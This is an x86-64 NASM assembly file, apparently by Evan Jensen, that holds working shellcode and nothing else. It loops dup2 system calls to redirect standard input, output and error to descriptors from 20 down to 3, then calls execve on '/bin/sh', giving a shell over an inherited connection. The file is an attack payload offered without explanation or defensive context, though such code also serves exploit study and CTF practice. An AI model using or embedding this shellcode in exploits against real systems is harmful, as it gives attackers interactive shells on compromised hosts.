	;; Evan Jensen 64bit local shellcode
	;; 021813
	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
BITS 64
global main
	extern execve

main:	
	xor rax,rax
	xor rdi,rdi
	mov dil,20		;dup2 everything to fd me (I hope)
reset:
	xor rsi,rsi
	mov sil,2		;counter	
copy:
	xor rax,rax
	mov al,33
	syscall
	dec rsi
	jns copy
	
	;; now just some local shellcode
	dec rdi
	cmp dil,2
	jnz reset
	xor rax,rax
	push rax
	mov rdi, 0x68732f2f6e69622f ;/bin/sh
	push rdi
	mov al,59 		;execve in unistd_64.h
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall

